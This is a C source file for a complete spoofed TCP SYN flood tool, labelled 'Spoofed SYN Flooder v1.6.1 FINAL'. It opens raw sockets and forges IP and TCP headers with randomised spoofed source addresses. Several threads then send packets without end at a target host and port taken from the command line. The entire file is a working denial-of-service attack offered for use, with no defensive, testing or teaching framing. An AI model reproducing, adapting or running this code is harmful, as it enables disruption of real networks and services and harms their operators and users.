#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <sys/time.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static uint32_t Q[4096], c = 362436;

struct thread_data {
	int thread_id;
	unsigned int floodport;
	struct sockaddr_in sin;
	char* attack_ips;
	int single;
	int attack_sleep;
};

void init_rand(uint32_t x) {
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;

	for (i = 3; i < 4096; i++) {
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}

uint32_t rand_cmwc(void) {
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

/* function for header checksums */
unsigned short csum (unsigned short *buf, int nwords) {
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--) {
		sum += *buf++;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph) {
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = 6;  // upper layer protocol, TCP
	iph->check = 0;

	// Initial IP, changed later in infinite loop
	iph->saddr = inet_addr("192.168.3.100");
}

void setup_tcp_header(struct tcphdr *tcph) {
	tcph->source = htons(5678);
	tcph->seq = random();
	tcph->ack_seq = 0;
	tcph->res2 = 0;
	tcph->doff = 5; // Make it look like there will be data
	tcph->syn = 1;
	// tcph->window = htonl(65535);
	tcph->window = htonl(29200);
	tcph->check = 0;
	tcph->urg_ptr = 0;
}

unsigned short tcp_csum(struct iphdr *ip, const char *buf, unsigned size)
{
	unsigned sum = 0;
	int i;
	
	/*
	source address: 32 bits/4 bytes, taken from IP header
	destination address: 32bits/4 bytes, taken from IP header
	resevered: 8 bits/1 byte, all zeros
	protocol: 8 bits/1 byte, taken from IP header. In case of TCP, this should always be 6, which is the assigned protocol number for TCP.
	TCP Length: The length of the TCP segment, including TCP header and TCP data. Note that this field is not available in TCP header, therefore is computed on the fly.
	*/
	
	// pseudo sum
	sum += (ip->saddr & 0xffff ) + (ip->saddr >> 16);
	sum += (ip->daddr & 0xffff) + (ip->daddr >> 16);
	sum += ntohs(6);
	sum += ntohs(20);
	
	/* Accumulate checksum */
	for (i = 0; i < size - 1; i += 2)
	{
		unsigned short word16 = *(unsigned short *) &buf[i];
		// unsigned short word16 = (unsigned short)( ((unsigned short)buf[i] << 8) + ( (unsigned short)buf[i+1] & 0xff ));
		sum += word16;
	}

	/* Handle odd-sized case */
	if (size & 1)
	{
		unsigned short word16 = (unsigned char) buf[i];
		// unsigned short word16 = ((unsigned short)buf[i] & 0xff);
		sum += word16;
	}

	/* Fold to get the ones-complement result */
	while (sum >> 16) sum = (sum & 0xFFFF)+(sum >> 16);

	/* Invert to get the negative in ones-complement arithmetic */
	return ~sum;
}

int ipow(int a, int b){
	int i;
	int c=1;
	for(i=0; i < b; i++) {
		c *= a;
	}
	return c;
}
uint32_t gen_ip(char* ip_rule) {
	int i,j;
	int len = strlen(ip_rule);
	j=0;
	uint32_t ip = 0;
	int shift = 0;
	int digit = 0;
	int part = 0;
	for(i=len-1; i>=0; i--){
		char c = ip_rule[i];
		// printf("%c ", c);
		
		int num=-1;
		if(c == 'x') {
			// num = rand() % 10;
			num = rand_cmwc() % 10;
		} else if(c >= '0' && c <= '9') {
			num = c - 0x30;
		}
		if(num >= 0) {
			// printf("dig: %d\n", num);
			part += num * ipow(10, digit++);
			// printf("part %d\n", part);
		}
		
		if(c == '.' || i == 0) {
			j++;
			digit = 0;
			if(shift == 0 && part == 0) {
				part=1;
			}
			ip |= ((part & 0xff) << ((3-shift)*8));
			part = 0;
			shift++;
			// printf("\n");
			continue;
		}
	}
	// printf("ret=%d\n", ip);
	return ip;
}


void *flood(void *par1) {
	struct thread_data *td = (struct thread_data *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct tcphdr *tcph = (/*u_int8_t*/void *)iph + (5 * sizeof(u_int32_t));
	struct sockaddr_in sin = td->sin;

	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0) {
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}

	unsigned int floodport = td->floodport;

	// Clear the data
	memset(datagram, 0, MAX_PACKET_SIZE);

	// Set appropriate fields in headers
	setup_ip_header(iph);
	setup_tcp_header(tcph);

	tcph->dest = td->sin.sin_port; //htons(floodport);
	
	char szBuffer[1024];
	if(gethostname(szBuffer, sizeof(szBuffer)) != 0) {
		return 0;
	}

	struct hostent *host = gethostbyname(szBuffer);
	if(host == NULL) {
		return 0;
	}

	iph->daddr = sin.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);

	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0) {
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}

	uint32_t random_num;
	uint32_t ul_dst;
	init_rand(time(NULL));
	while(1) {
		int i;
		int j;
		int piece=0;
		
		random_num = rand_cmwc();

		// generate random ip based on attack_ips rules
		ul_dst = gen_ip(td->attack_ips);

		// iph->saddr = ul_dst;
		iph->saddr = ul_dst;
		tcph->source = htons(random_num & 0xFFFF);
		// tcph->source = 5000;
		// printf("tcphdr: %d\n", sizeof(struct tcphdr));
		tcph->check = 0;
		tcph->check = tcp_csum( iph, (void*)tcph, sizeof(struct tcphdr) );
		// printf("tcph->check2: %0X\n", tcph->check);
		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
		for(i=0; i<1; i++) {
			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
		}
		
		if(td->single) {
			return 0;
		}
		// usleep(10000);
		usleep(td->attack_sleep);
		// break;
	}
}
int main(int argc, char *argv[ ]) {
	if(argc < 4) {
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stdout, "Spoofed SYN Flooder v1.6.1 FINAL by ohnoes1479\nUsage: %s <target IP/hostname> <port to be flooded> <number threads to use> <time (optional)>\n", argv[0]);
		exit(-1);
	}

	fprintf(stdout, "Setting up Sockets...\n");
	int i;
	// srand(time(0));
	// init_rand(time(NULL));
	
	struct timeval time; 
	gettimeofday(&time,NULL);

	init_rand((time.tv_sec * 1000) + (time.tv_usec / 1000));
	 
	int port;
	int threads;
	char* ip;
	char *attack_ips;
	int single = 0;
	int nsleep = 0;
	int attack_sleep = 1000;
	for(i=0; i < argc; i++) {
		if (*argv[i] == '-') {
			if(!strcmp(argv[i], "--attack-ips")) {
				attack_ips = argv[++i];
			} else if(!strcmp(argv[i], "--ip")) {
				ip = argv[++i];
			} else if(!strcmp(argv[i], "-p") || !strcmp(argv[i], "--port")) {
				port = atoi(argv[++i]);
			} else if(!strcmp(argv[i], "-t") || !strcmp(argv[i], "--threads")) {
				threads = atoi(argv[++i]);
			} else if(!strcmp(argv[i], "-s") || !strcmp(argv[i], "--single")) {
				single=1;
			} else if(!strcmp(argv[i], "--sleep") || !strcmp(argv[i], "--duration")) {
				nsleep = atoi(argv[++i]);
			} else if(!strcmp(argv[i], "--attack-sleep")) {
				attack_sleep = atoi(argv[++i]);
			}
		}
	}
	printf("parsed attack-ips: %s ip: %s port: %d threads: %d single: %d\n", attack_ips, ip, port, threads, single);
	int num_threads = threads;
	unsigned int floodport = port;
	
	pthread_t thread[num_threads];
	struct sockaddr_in sin;

	sin.sin_family = AF_INET;
	sin.sin_port = htons(floodport);
	sin.sin_addr.s_addr = inet_addr(ip);

	struct thread_data td[num_threads];

	for(i = 0; i<num_threads; i++) {
		td[i].thread_id = i;
		td[i].sin = sin;
		td[i].floodport = floodport;
		td[i].attack_ips = attack_ips;
		td[i].single = single;
		td[i].attack_sleep = attack_sleep;
		pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
		if(single) {
			pthread_join(thread[i],0);
			break;
		}
	}
	fprintf(stdout, "Starting %s...\n", !single ? "Flood" : "Single");
	if(argc > 4) {
		sleep(nsleep);
	} else {
		// wait forever
		while(1) {
			sleep(1);
		}
	}

	return 0;
}
